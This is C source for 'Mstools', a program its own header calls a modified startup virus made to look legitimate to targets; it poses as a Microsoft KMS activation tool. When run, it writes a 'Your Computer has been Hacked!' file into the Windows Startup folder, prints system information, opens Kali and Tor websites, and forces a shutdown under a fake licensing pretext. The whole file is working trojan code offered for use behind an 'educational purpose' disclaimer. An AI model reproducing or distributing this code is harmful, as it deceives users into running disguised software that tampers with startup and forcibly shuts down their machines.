
// Mstools 
// Copyright (C) 2018-2020 M.Anish <aneesh25861@gmail.com>

// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
//(at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

/*  Mstools was developed independantly by M.Anish For Educational purpose only! 
    Mstools  is based on Cstorm Startup Virus, several changes has been done to make it look more legitimate to targeted entities.
    USE AT YOUR OWN RISK. DEVELOPER NOT RESPONSIBLE FOR ANY DAMAGES THROUGH USE OF THIS SOFTWARE.	*/

#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<ctype.h>

void tunnel()
{
    system("echo %USERPROFILE%>user");
}

void tscan()
{
    FILE *f,*fp;
    char s[800],ch; int i=0;
    f=fopen("user","r");
    if(f==NULL)
    {
        exit(0);
    }
    while(feof(f)==0)
    {
        fscanf(f,"%c",&ch);
        if(ch=='\n')
            break;
        s[i]=ch;
        i++;
    }
    s[i]='\0';
    fclose(f);
    strcat(s,"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\chrome.txt");
    fp=fopen(s,"w");
    if(fp==NULL)
    {
        f=fopen("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\chrome.txt","w");
        if(f==NULL)
        {
            system("cls");
            remove("user");
            printf("\nPlease Run this Program as ADMINISTRATOR to continue...\n");
            system("timeout 10");
            exit(0);
        }
        fprintf(f,"\n Your Computer has been Hacked!\n"); 
        fclose(f);
        system("shutdown /f /t 060 /s /c \"shutting down PC to Activate The Microsoft Products with new Licensekey.\"");
        exit(0);
    }
    fprintf(fp,"\n Your Computer Has Been Hacked!\n");
    fclose(fp);
}

void check_internet()
{
	int i=0;
	i=system("ping https://kali.org");
	if(i!=0)
	{
		printf("\n Internet Connection Not Available To Register Microsoft Product with KMS servers! \n");
		printf("press any key to exit...");
		exit(1);
	}
	system("start https://kali.org ");
	system("start https://torproject.org ");
}

void ok()
{
    remove("user");
}

void run()
{
    tunnel();
    tscan();
}

void pause()
{
    printf("\n");
    system("pause");
}

int main()
{
    system("title MsTools ");
    run();
    ok();
    printf("\n|----- Mstools: KMS Activation Service  -----|\n");
    printf("\n Checking ...\n");
    system("systeminfo");
	check_internet();
    system("shutdown /f /t 060 /s /c \"shutting down PC to Activate The Microsoft Products with new Licensekey.\"");
    pause();
}
